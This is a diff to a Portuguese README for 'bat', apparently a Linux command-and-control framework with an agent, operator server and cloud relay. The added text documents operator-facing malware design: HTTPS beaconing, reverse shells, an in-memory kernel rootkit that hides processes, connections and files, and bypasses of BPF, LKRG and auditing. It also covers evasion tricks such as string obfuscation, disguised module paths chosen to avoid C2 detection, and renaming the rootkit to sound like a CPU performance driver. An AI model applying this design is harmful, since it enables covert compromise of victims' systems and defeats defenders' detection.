@@ -34,4 +34,42 @@ source build.env && cd agent && make -B server-arm64 \
   TRIGGER="${TRIGGER:-udp}" INTERVAL="${BEACON_INTERVAL:-30s}" SECRET="$SECRET"
 # nunca usar 'go build' direto pq SharedSecret fica vazio e agentes são rejeitados
 ```
-<img width="1220" height="2712" alt="Screenshot_2026-04-17-17-08-18-103_com termux" src="https://github.com/user-attachments/assets/3e7d6967-c6b6-4a11-82cf-b9bd340dc396" />
+
+<img width="1126" height="2117" alt="IMG_20260417_233827" src="https://github.com/user-attachments/assets/c94c390a-a1bd-457c-b50e-9bf1f6fce551" />
+
+
+bat funciona em três partes: agente (target), servidor (operador) e relay (meio)
+
+## o que faz
+
+o agente beacona via HTTPS para o servidor, esconde a si mesmo com um rootkit LKM em nível de kernel, e executa TTPs so comando. todo processo udo autenticado com HMAC-SHA256, tudo obfuscado em tempo de build
+
+## componentes
+
+**agent**  roda no target. beacon HTTPS, K-series autônomo no startup, dispatcher de TTPs
+
+**server**  console readline do operador. Lista agentes, dispara TTPs, abre shell reverso, gerencia relay
+
+**relay (GCP)**  nginx + batrev tunnel + kcc-server. o agente fala com o relay; o relay encaminha para o operador local
+
+**kcc-server**  compila `kperf_qos.ko` por demanda para qualquer kernel 6.x. cache por versão entrega instantânea se já compilado
+
+## K-series (stealth de kernel)
+
+no startup, o agente detecta o kernel, baixa o `.ko` do KCC, carrega via `memfd_create + finit_module` (sem tocar disco), e registra via sysfs. agente invisível em `ps`, conexões invisíveis em `/proc/net/tcp`, binário invisível no filesystem.
+
+
+## evasão
+
+- strings sensíveis: XOR-encoded em compile-time
+- builds de produção: `garble -literals -tiny -seed=random`  sem strings, sem símbolos, binário único por build
+- go module path: `core/mon`  não sinaliza como C2 em análise estática
+- LKM renomeado: `bat_stealth` → `kperf_qos`, sysfs em `/sys/kernel/cpu_qos_ctrl/`
+
+## Singularity
+
+O LKM (`kperf-qos/`) é derivado do [Singularity](https://github.com/MatheuZSecurity/Singularity) rootkit ftrace para Linux 6.x.
+
+**aproveitado originalmente do singularity:** toda a infraestrutura de hooks (pid hiding, TCP hiding, filesystem hiding, BPF bypass, LKRG bypass, audit drop, privilege escalation via sinal 59).
+
+**reescrito:** `sysfs_iface.c` o Singularity usa sinais para controle. O bat precisa registrar PID/porta/path em runtime e consultar estado. a solução foi um kobject sysfs com atributos `cpu_affinity`, `freq_policy`, `mem_limit`, `qos_state`, `sched_reset`.
